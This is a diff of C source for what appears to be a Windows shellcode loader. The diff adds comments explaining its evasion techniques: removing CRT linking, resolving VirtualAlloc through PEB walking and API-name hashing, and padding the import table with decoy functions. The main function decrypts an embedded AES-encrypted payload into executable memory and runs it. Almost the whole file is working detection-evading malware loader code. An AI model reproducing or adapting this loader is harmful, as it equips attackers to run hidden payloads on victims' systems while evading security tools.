@@ -1,3 +1,5 @@
+/* Obfuscating what functions are being used by removing CRT linking */
+
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -5,6 +7,7 @@
 #include <winternl.h>
 #include <conio.h>
 #include "tiny_aes.h"
+// A library that will keep custom functions to replace ones that are usually defined in the CRT
 #include "redefined_crt_functions.h"
 
 #define AES256 1
@@ -13,24 +16,24 @@
 #define VirtualAlloc_HASH 0xF625556A
 
 #define INITIAL_SEED 7
-UINT32 HASHA(_In_ PCHAR String)
+UINT32 HASHA(_In_ PCHAR string)
 {
-	SIZE_T Index = 0;
-	UINT32 Hash = 0;
-	SIZE_T Length = lstrlenA(String);
+	SIZE_T index = 0;
+	UINT32 hash = 0;
+	SIZE_T length = lstrlenA(string);
 
-	while (Index != Length)
+	while (index != length)
 	{
-		Hash += String[Index++];
-		Hash += Hash << INITIAL_SEED;
-		Hash ^= Hash >> 6;
+		hash += string[index++];
+		hash += hash << INITIAL_SEED;
+		hash ^= hash >> 6;
 	}
 
-	Hash += Hash << 3;
-	Hash ^= Hash >> 11;
-	Hash += Hash << 15;
+	hash += hash << 3;
+	hash ^= hash >> 11;
+	hash += hash << 15;
 
-	return Hash;
+	return hash;
 }
 
 
@@ -73,77 +76,77 @@ BYTE encrypted_payload[] = {
 0x09,0xcb,0xd7,0xaf,0x2f,0xc2,0x16,0x16,0x28,0xf5,0x41,0xae,0xb5,0xd5,0x62,0x59,
 };
 
-HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {
+// Retrieves a module handle using the hash of the uppercase module name. This 
+// prevents the need to keep a string of that module in the program.
+HMODULE get_module_handle_hash(DWORD hashed_name) {
 
-	if (dwModuleNameHash == NULL)
+	if (hashed_name == NULL)
 		return NULL;
 
-	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
+	PPEB peb = (PEB*)(__readgsqword(0x60));
 
-	PPEB_LDR_DATA            pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
-	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
+	PPEB_LDR_DATA ldr = (PPEB_LDR_DATA)(peb->Ldr);
+	PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(ldr->InMemoryOrderModuleList.Flink);
 
-	while (pDte) {
+	while (dte) {
 
-		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
+		if (dte->FullDllName.Length != NULL && dte->FullDllName.Length < MAX_PATH) {
 
-			// Converting `FullDllName.Buffer` to upper case string 
-			CHAR UpperCaseDllName[MAX_PATH];
+			CHAR upper_dll_name[MAX_PATH];
 
 			DWORD i = 0;
-			while (pDte->FullDllName.Buffer[i]) {
-				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
+			while (dte->FullDllName.Buffer[i]) {
+				upper_dll_name[i] = (CHAR)toupper(dte->FullDllName.Buffer[i]);
 				i++;
 			}
-			UpperCaseDllName[i] = '\0';
+			upper_dll_name[i] = '\0';
 
-			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
-			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
-				return pDte->Reserved2[0];
+			if (HASHA(upper_dll_name) == hashed_name)
+				return dte->Reserved2[0];
 
 		}
 		else {
 			break;
 		}
 
-		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
+		dte = *(PLDR_DATA_TABLE_ENTRY*)(dte);
 	}
 
 	return NULL;
 }
 
-FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
+// Retrieves a module handle using the hash of the function name. This 
+// prevents the need to keep a string of that function in the program.
+FARPROC get_proc_address_hash(HMODULE module, DWORD hashed_name) {
 
-	if (hModule == NULL || dwApiNameHash == NULL)
+	if (module == NULL || hashed_name == NULL)
 		return NULL;
 
-	PBYTE pBase = (PBYTE)hModule;
+	PBYTE base = (PBYTE)module;
 
-	PIMAGE_DOS_HEADER         pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
-	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+	PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)base;
+	if (image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
 		return NULL;
 
-	PIMAGE_NT_HEADERS         pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
-	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+	PIMAGE_NT_HEADERS image_nt_headers = (PIMAGE_NT_HEADERS)(base + image_dos_header->e_lfanew);
+	if (image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
 		return NULL;
 
-	IMAGE_OPTIONAL_HEADER     ImgOptHdr = pImgNtHdrs->OptionalHeader;
+	IMAGE_OPTIONAL_HEADER image_opt_header = image_nt_headers->OptionalHeader;
 
-	PIMAGE_EXPORT_DIRECTORY   pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	PIMAGE_EXPORT_DIRECTORY image_exp_dir = (PIMAGE_EXPORT_DIRECTORY)(base + image_opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
 
-	PDWORD  FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
-	PDWORD  FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
-	PWORD   FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+	PDWORD  function_names = (PDWORD)(base + image_exp_dir->AddressOfNames);
+	PDWORD  function_addresses = (PDWORD)(base + image_exp_dir->AddressOfFunctions);
+	PWORD   function_ordinals = (PWORD)(base + image_exp_dir->AddressOfNameOrdinals);
 
-	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
-		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
-		PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+	for (DWORD i = 0; i < image_exp_dir->NumberOfFunctions; i++) {
+		CHAR* function_name = (CHAR*)(base + function_names[i]);
+		PVOID func_address = (PVOID)(base + function_addresses[function_ordinals[i]]);
 
-		// Hashing every function name pFunctionName
-		// If both hashes are equal then we found the function we want 
-		if (dwApiNameHash == HASHA(pFunctionName)) {
-			return pFunctionAddress;
+		if (hashed_name == HASHA(function_name)) {
+			return func_address;
 		}
 	}
 
@@ -153,23 +156,33 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
 int main() {
 	SIZE_T len = sizeof(encrypted_payload);
 
+	// Initialize the context (ctx) for following AES operations
 	struct AES_ctx ctx;
 	AES_init_ctx_iv(&ctx, key, iv);
 
+	// Definition of function pointer for VirtualAlloc. We will use this to 
+	// typecast the function pointer returned by our get_proc_address_hash function	
 	typedef LPVOID(WINAPI* fnVirtualAlloc) (
 		LPVOID lpAddress,
 		SIZE_T dwSize,
 		DWORD flAllocationType,
 		DWORD flProtect
-		);
+	);
 
-	HMODULE hKernel32Module = GetModuleHandleH(KERNEL32DLL_HASH);
-	fnVirtualAlloc pVirtualAlloc = GetProcAddressH(hKernel32Module, VirtualAlloc_HASH);
+	// Retrieve the proc address of VirtualAlloc in kernel32.dll. 
+	// We did not have to load kernel32.dll, since the PE loads it at launch anyway
+	HMODULE kernel32_module = get_module_handle_hash(KERNEL32DLL_HASH);
+	fnVirtualAlloc my_virtual_alloc = get_proc_address_hash(kernel32_module, VirtualAlloc_HASH);
 
-	void* executable_memory = pVirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	// Allocate memory that has read, write, and execute permission.
+	void* executable_memory = my_virtual_alloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	/* You may have noticed that the check here for whether VirtualAlloc returns NULL is gone.
+	That is because it included a printf, a function not present in the CRT */
 
+	// Copy the encrypted payload into the allocated memory
 	memcpy(executable_memory, encrypted_payload, len);
 
+	// Decrypt the payload in place using AES
 	AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
 
 	((void(*)()) executable_memory)();
@@ -180,6 +193,8 @@ int main() {
 	DWORD read;
 	ReadConsoleA(h, &ch, 1, &read, NULL);
 
+	/* An impossible branch, but since optimization is disabled, the compiler adds these 
+	innocent looking functions to the IAT. */
 	int i = 0;
 	if (i > 100) {
 		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
